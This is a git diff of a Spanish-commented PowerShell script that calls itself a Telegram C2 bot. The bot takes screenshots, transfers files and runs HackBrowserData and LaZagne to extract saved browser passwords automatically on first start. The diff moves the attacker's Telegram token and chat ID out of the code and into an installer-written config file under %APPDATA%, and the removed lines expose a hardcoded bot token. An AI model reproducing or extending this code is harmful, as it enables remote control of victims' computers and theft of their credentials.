@@ -1,22 +1,34 @@
 <#
     bot.ps1 - Telegram C2 Bot (PowerShell 5.1)
-    - Screenshot multi-monitor (full screen todos los tamanos)
-    - Comandos unicos (fix $args -> $cmdArgs)
-    - Extraccion automatica de passwords en primer arranque (espera a que cierres navegadores)
-    - /update manual desde GitHub
-    - Edicion de archivos: el bot envia, tu reenvias y se sobrescribe en su ruta original
-    - Botones, pausa de envio, navegacion y transferencia de archivos
+    SIN claves: las lee de %appdata%\CarpetaDos\config.ini (lo escribe el instalador)
+    o por parametro -Token / -ChatId.
 #>
 
 param(
-    [string]$Token  = "8953928916:AAEmD2LH0QYtS-IH7LjIvf82Fo9_vvyAT7s",
-    [string]$ChatId = "6131889274"
+    [string]$Token  = "",
+    [string]$ChatId = ""
 )
 
-# === CONFIGURACION ===
+# === CONFIGURACION / RUTAS ===
+$BaseDir     = "$env:APPDATA\CarpetaDos"
+$ConfigFile  = "$BaseDir\config.ini"
+
+# Cargar claves desde config.ini si no vienen por parametro
+if ([string]::IsNullOrWhiteSpace($Token) -or [string]::IsNullOrWhiteSpace($ChatId)) {
+    if (Test-Path $ConfigFile) {
+        Get-Content $ConfigFile | ForEach-Object {
+            if ($_ -match '^\s*TOKEN\s*=\s*(.+?)\s*$')   { if ([string]::IsNullOrWhiteSpace($Token))  { $Token  = $matches[1].Trim() } }
+            if ($_ -match '^\s*CHAT_ID\s*=\s*(.+?)\s*$') { if ([string]::IsNullOrWhiteSpace($ChatId)) { $ChatId = $matches[1].Trim() } }
+        }
+    }
+}
+if ([string]::IsNullOrWhiteSpace($Token) -or [string]::IsNullOrWhiteSpace($ChatId)) {
+    Write-Host "Faltan TOKEN/CHAT_ID. Ejecuta el instalador o pasalos con -Token y -ChatId."
+    exit 1
+}
+
 $ApiUrl      = "https://api.telegram.org/bot$Token"
 $ApiFile     = "https://api.telegram.org/file/bot$Token"
-$BaseDir     = "$env:APPDATA\CarpetaDos"
 $LogFile     = "$BaseDir\bot.log"
 $HackPath    = "$BaseDir\hackbrowserdata.exe"
 $LaZagnePath = "$BaseDir\lazagne.exe"
@@ -39,9 +51,9 @@ $script:LaZagneCompleted      = $false
 $script:ArchivosHBDEnviados   = 0
 $script:SendPaused            = $false
 $script:FileQueue             = New-Object System.Collections.ArrayList
-$script:PwAutoDone            = $false      # extraccion automatica de passwords ya hecha
+$script:PwAutoDone            = $false
 $script:PwWaitNotified        = $false
-$script:EditFiles             = @{}         # nombreArchivo -> rutaOriginal (para edicion)
+$script:EditFiles             = @{}
 
 New-Item -ItemType Directory -Path $BaseDir   -Force -ErrorAction SilentlyContinue | Out-Null
 New-Item -ItemType Directory -Path $UploadDir -Force -ErrorAction SilentlyContinue | Out-Null
